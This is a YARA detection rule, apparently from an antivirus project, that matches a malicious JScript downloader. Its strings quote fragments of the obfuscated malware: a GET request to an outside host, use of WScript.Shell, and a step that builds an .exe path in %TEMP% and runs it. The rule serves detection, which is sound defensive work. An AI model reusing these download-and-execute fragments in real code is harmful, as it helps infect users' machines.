rule sig_20160401_e0174980010f188bacdf4e3f2a46cd93 {
  meta:
    description = "datamaliciousorder - file 20160401_e0174980010f188bacdf4e3f2a46cd93.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4cc3d52e7dd39a90f699e4ee3103f85165340dd6598f8bbbcd15a63114a43edb"

  strings:
    $s1  = "QrEq[EmXx](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function AssOrj(DvvHu, DhPek){JkTr = JkTr * 1; return DvvHu - DhPek;};" fullword ascii
    $s3  = "var EoaUd = function ThPt() {return WScript[WkmRb](\"WScript\"+\".Shell\");}(), XgqQxz = 11;" fullword ascii
    $s4  = "if (QrEq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MkjIb() {return EoaUd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ykN50QiyNK.ex\" + \"e\";};" fullword ascii
    $s6  = "function UnFzn(){return LnDzm + \"\";};" fullword ascii
    $s7  = "function PyIdv() {return ((FrcGst == true) && (FrcGst == IcbCdo)) ? 1 : JkTr;};" fullword ascii
    $s8  = "var NinAr = false;" fullword ascii
    $s9  = "}while (BeQkm);" fullword ascii
    $s10 = "var IcbCdo = false;" fullword ascii
    $s11 = "var FrcGst = false;" fullword ascii
    $s12 = "function JnoYy(){return 23;};" fullword ascii
    $s13 = "IcbCdo = true; " fullword ascii
    $s14 = "FrcGst = true; " fullword ascii
    $s15 = "function OuzWqp()" fullword ascii
    $s16 = "var FqmBtm = new this[\"Date\"]();" fullword ascii
    $s17 = "return AssOrj(HnFm, YpvTpr);" fullword ascii
    $s18 = "function FqxUth(){return WkmRb;};" fullword ascii
    $s19 = "function EqUbg(SlsUij){EoaUd[\"R\"+\"un\"](SlsUij, JkTr, JkTr);};" fullword ascii
    $s20 = "function TzLvw(YiIxs) {var DqRb = (1, 2, 3, 4, 5, YiIxs); return DqRb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}